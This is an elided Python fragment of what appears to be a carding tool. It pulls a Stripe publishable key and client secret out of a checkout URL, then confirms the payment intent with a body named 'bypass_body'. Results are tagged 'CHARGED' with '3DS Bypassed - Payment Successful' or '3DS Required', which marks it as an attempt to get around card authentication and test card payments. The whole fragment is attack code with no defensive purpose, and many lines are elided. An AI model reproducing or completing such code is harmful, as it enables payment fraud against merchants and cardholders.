...
def decode_pk_from_url(url: str) -> tuple[Optional[str], Optional[str]]:
    ...
    if "#" in url:
        try:
            buf = base64.b64decode(url.split("#")[1] + "==")
            ...
            if "error" in conf:
                ...
                if st == "succeeded":
                    ...
                    bypass_body = "&".join([
                        ...
                        "expected_payment_method_type=card",
                        "use_stripe_sdk=true",
                        f"key={pk}", f"client_secret={pi_cs}",
                    ])
                    async with s.post(
                        f"https://api.stripe.com/v1/payment_intents/{pi_id}/confirm",
                        headers=STRIPE_HEADERS, data=bypass_body
                    ) as r:
                    ...
                    if "error" not in bypass:
                        ...
                        if b_st == "succeeded":
                            result.update(status="CHARGED",
                                          response="3DS Bypassed - Payment Successful")
                            ...
                            if r_url:
                                try:
                                    async with s.get(r_url, allow_redirects=True): pass
                                    final_body = f"key={pk}&client_secret={pi_cs}"
                                    async with s.post(
                                        f"https://api.stripe.com/v1/payment_intents/{pi_id}",
                                        headers=STRIPE_HEADERS, data=final_body
                                    ) as r:
                                    ...
                                    if final.get("status") == "succeeded":
                                        ...
                                        result.update(status="3DS",
                                                      response="3DS Required - Manual Auth Needed")
                                except Exception:
                                    result.update(status="3DS", response="3DS Required")
                            else:
                                result.update(status="3DS", response="3DS Required")
                        else:
                            result.update(status="3DS", response=f"3DS: {b_st}")
                    else:
                        result.update(status="3DS", response="3DS Required")
